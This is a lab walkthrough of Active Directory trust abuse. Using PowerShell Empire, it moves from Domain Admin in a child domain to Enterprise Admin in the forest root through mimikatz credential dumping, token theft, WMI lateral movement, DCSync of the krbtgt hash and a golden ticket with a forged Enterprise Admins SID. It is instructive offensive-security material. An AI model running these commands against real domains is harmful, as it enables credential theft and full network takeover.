---
description: >-
  Explore Parent-Child Domain Trust Relationships and abuse it for Privilege
  Escalation
---

# From Domain Admin to Enterprise Admin

This lab is based on an [Empire Case Study](https://enigma0x3.net/2016/01/28/an-empire-case-study/) and its goal is to get more familiar with some of the concepts of PowerShell Empire and its modules as well as Active Directory concepts such as Forests, Parent/Child domains and Trust Relationships and how they can be abused to escalate privileges.

The end goal of this lab is a privilege escalation from DA on a child domain to EA on a root domain.

### Domain Trust Relationships

Firstly, some LAB setup - we need to create a child domain controller as well as a new forest with a new domain controller.

### Parent / Child Domains

After installing a child domain `red.offense.local` of a parent domain `offense.local`, Active Directory Domains and Trusts show the parent-child relationship between the domains as well as their default trusts:

![](<../../.gitbook/assets/image (152)>)

Trusts between the two domains could be checked from PowerShell by issuing:

```
Get-ADTrust -Filter *
```

The first console shows the domain trust relationship from `offense.local` perspective and the second one from `red.offense.local`. Note the direction is `BiDirectional` which means that members can authenticate from one domain to another when they want to access shared resources:

![](<../../.gitbook/assets/image (153)>)

Similar, but very simplified information could be gleaned from a native Windows binary:

```
nltest /domain_trusts
```

![](<../../.gitbook/assets/image (154)>)

PowerShell way of checking trust relationships:

```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

![](<../../.gitbook/assets/image (155)>)

### Forests

After installing a new DC `dc-blue` in a new forest, let's setup a one-way trust between `offense.local` and `defense.local` domains using controllers `dc-mantvydas.offense.local` and `dc-blue.defense.blue`.

First off, set conditional DNS forwarders on both DCs:

![](<../../.gitbook/assets/image (156)>)

Add a new trust by making `dc-mantvydas` a trusted domain:

![](<../../.gitbook/assets/image (157)>)

Set the trust type to `Forest`:

![](<../../.gitbook/assets/image (158)>)

Incoming trust for `dc-mantvydas.offense.local` is now created:

![](<../../.gitbook/assets/image (159)>)

Testing nltest output:

![](<../../.gitbook/assets/image (160)>)

### Forests Test

Now that the trust relationship is set, it is easy to check if it was done correctly. What should happen now is that resources on `defense.local` (trusting domain) should be available to members of `offense.local` (trusted domain).

Note how the user on `dc-mantvydas.offense.local` is not able to share a folder to `defense\administrator` (because `offense.local` does not trust `defense.local`):

![](<../../.gitbook/assets/image (161)>)

However, `dc-blue.defense.local` trusts `offense.local`, hence is able to share a resource to one of the members of `offense.local` — forest trust relationships work as intended:

![](<../../.gitbook/assets/image (162)>)

### Back to Empire: From DA to EA

Assume we got our first agent back from the computer `PC-MANTVYDAS$`:

![](<../../.gitbook/assets/image (163)>)

### Credential Dumping

Since the agent is running within a high integrity process, let's dump credentials - some interesting credentials can be observed for a user in `red.offense.local` domain:

![](<../../.gitbook/assets/image (164)>)

Listing the processes with `ps`, we can see a number of processes running under the `red\spotless` account. Here is one:

![](<../../.gitbook/assets/image (165)>)

The domain user is of interest, so we would use the Empire module:

```
usemodule situational_awareness/network/powerview/get_user
```

to enumerate the `red\spotless` user and see if it is a member of any interesting groups. (In this lab the Empire instance did not return results for that command; assume it showed that `red\spotless` is a member of the `Administrators` group on the `red.offense.local` domain.)

### Token Manipulation

Let's steal the token of a process with PID 4900 that runs with `red\spotless` credentials (example screenshot shows using Empire to stealtoken):

![](<../../.gitbook/assets/image (166)>)

### DC Recon

After assuming privileges of the member `red\spotless`, let's get the Domain Controller computer name for that user. Example custom command used:

```
shell [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | ForEach-Object { $_.Name }
```

![](<../../.gitbook/assets/image (167)>)

Check if we have admin access to the `DC-RED`:

```
shell dir \\dc-red.red.offense.local\c$
```

![](<../../.gitbook/assets/image (168)>)

We are lucky — the user is a domain admin as can be seen from the above screenshot.

### Lateral Movement

Let's get an agent from `DC-RED` — note that the credentials are coming from the previous dump with mimikatz:

```
usemodule lateral_movement/invoke_wmi
```

![](<../../.gitbook/assets/image (169)>)

We now have the agent back, let's just confirm it:

![](<../../.gitbook/assets/image (170)>)

### Checking Trust Relationships

Once in `DC-RED`, let's check any domain trust relationships via PowerView in Empire:

```
usemodule situational_awareness/network/powerview/get_domain_trust
```

![](<../../.gitbook/assets/image (171)>)

We see that `red.offense.local` is a child domain of `offense.local` domain, which is automatically trusting and trusted (two-way trust/bidirectional) with `offense.local`.

### From DA to EA

We will now try to escalate from DA in `red.offense.local` to EA in `offense.local`. We need to create a golden ticket for `red.offense.local` and forge it to make us an EA in `offense.local`.

First, get a SID of the `krbtgt` user account in `offense.local`:

```
(Empire: powershell/situational_awareness/network/powerview/get_domain_trust) > usemodule powershell/management/user_to_sid
(Empire: powershell/management/user_to_sid) > set Domain offense.local
(Empire: powershell/management/user_to_sid) > set User krbtgt
(Empire: powershell/management/user_to_sid) > run
```

![](<../../.gitbook/assets/image (172)>)

After getting a SID of the `offense.local\krbtgt`, we need to get a password hash of the `krbtgt` account in the compromised DC `DC-RED` (we can extract it since we are a domain admin in `red.offense.local`):

```
(Empire: powershell/management/user_to_sid) > usemodule powershell/credentials/mimikatz/dcsync
(Empire: powershell/credentials/mimikatz/dcsync) > set user red\krbtgt
(Empire: powershell/credentials/mimikatz/dcsync) > execute
```

![](<../../.gitbook/assets/image (173)>)

### Golden Ticket for Root Domain

We can now generate a golden ticket for `offense.local\Domain Admins` since we have the SID of the `offense.local\krbtgt` and the hash of `red.offense.local\krbtgt`:

```
usemodule powershell/credentials/mimikatz/golden_ticket
(Empire: powershell/credentials/mimikatz/golden_ticket) > set user hakhak
(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519
(Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8
(Empire: powershell/credentials/mimikatz/golden_ticket) > run
```

Note how during `sids` specification, the last three digits were replaced from 502 (krbtgt) to 519 (enterprise admins) — this part of the process is called a SID History Attack:

```
set sids S-1-5-21-4172452648-1021989953-2368502130-519
```

![](<../../.gitbook/assets/image (174)>)

The `CredID` property in the dcsync module comes from Empire's credential store which previously got populated by our mimikatz'ing:

![](<../../.gitbook/assets/image (175)>)

We now should be Enterprise Admin in `offense.local` and we can test it by listing the admin share `c$` of `dc-mantvydas.offense.local`:

```
shell dir \\dc-mantvydas\c$
```

![](<../../.gitbook/assets/image (176)>)

### Agent from Root Domain

For the sake of fun and wrapping this lab up, let's get an agent from the `dc-mantvydas`:

![](<../../.gitbook/assets/image (177)>)

### Alternative: Exploit writeable Configuration NC

The Configuration NC is the primary repository for configuration information for a forest and is replicated to every DC in the forest. Every writable DC (not read-only DCs) in the forest holds a writable copy of the Configuration NC. Exploiting this requires running as SYSTEM on a (child) DC.

It is possible to compromise the root domain in various ways. Examples:

* Link GPO to root DC site (see: https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)
* Compromise gMSA (see: https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
* Schema attack (see: https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)
* Exploit ADCS — Create/modify certificate template to allow authentication as any user (e.g., Enterprise Admins)

SID filtering prevents the SID history attack, but not the Configuration NC/writeable NC attack.

### References

* [An Empire Case Study — enigma0x3](https://enigma0x3.net/2016/01/28/an-empire-case-study/)
* [http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/www.harmj0y.net](http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/www.harmj0y.net)
* [Understanding Trust Direction — Microsoft Learn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc731404\(v%3dws.10\))
* [Get-ADTrust (ActiveDirectory) — Microsoft Learn](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=winserver2012-ps)
* [Trust Technologies: Domain and Forest Trusts — Microsoft Learn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554\(v=ws.10\))
* [Security Identifiers — Microsoft Support](https://support.microsoft.com/en-gb/help/243330/well-known-security-identifiers-in-windows-operating-systems)

